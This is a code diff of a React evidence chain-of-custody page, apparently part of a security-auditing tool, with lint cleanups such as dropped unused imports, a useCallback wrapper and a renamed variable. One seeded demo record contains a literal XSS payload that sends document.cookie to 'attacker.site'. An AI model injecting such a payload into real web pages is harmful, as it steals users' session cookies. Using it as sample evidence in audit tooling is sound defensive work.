@@ -1,11 +1,9 @@
-import { useState, useEffect, useMemo } from 'react';
+import { useState, useEffect, useMemo, useCallback } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import {
-  Link,
   ShieldCheck,
   ShieldAlert,
   Search,
-  Clock,
   Sparkles,
   User,
   Fingerprint,
@@ -20,13 +18,11 @@ import {
 import { PageHeader, GlassCard, AnimatedCounter } from '@/components/ui';
 import {
   loadEvidence,
-  saveEvidence,
   verifyEvidenceIntegrity,
   logEvidenceAccess,
   createEvidenceRecord,
   logEvidenceModification,
   type EvidenceRecord,
-  type CustodyEntry
 } from '@/utils/evidenceChain';
 import { useToast } from '@/hooks/useToast';
 
@@ -39,17 +35,17 @@ export function EvidenceCustodyPage() {
   const [verificationResult, setVerificationResult] = useState<{ valid: boolean; message: string } | null>(null);
 
   // Load evidence from sessionStorage
-  const refreshRecords = () => {
+  const refreshRecords = useCallback(() => {
     const loaded = loadEvidence();
     setRecords(loaded);
     if (loaded.length > 0 && !selectedRecordId) {
       setSelectedRecordId(loaded[0].id);
     }
-  };
+  }, [selectedRecordId]);
 
   useEffect(() => {
     refreshRecords();
-  }, []);
+  }, [refreshRecords]);
 
   const selectedRecord = useMemo(() => {
     return records.find(r => r.id === selectedRecordId) || null;
@@ -94,7 +90,7 @@ export function EvidenceCustodyPage() {
       'audit-crawler'
     );
 
-    const xssEvidence = await createEvidenceRecord(
+    const _xssEvidence = await createEvidenceRecord(
       'finding-xss-leak-03',
       `<script>fetch('https://attacker.site/log?c=' + document.cookie)</script>`,
       'hunter-agent'
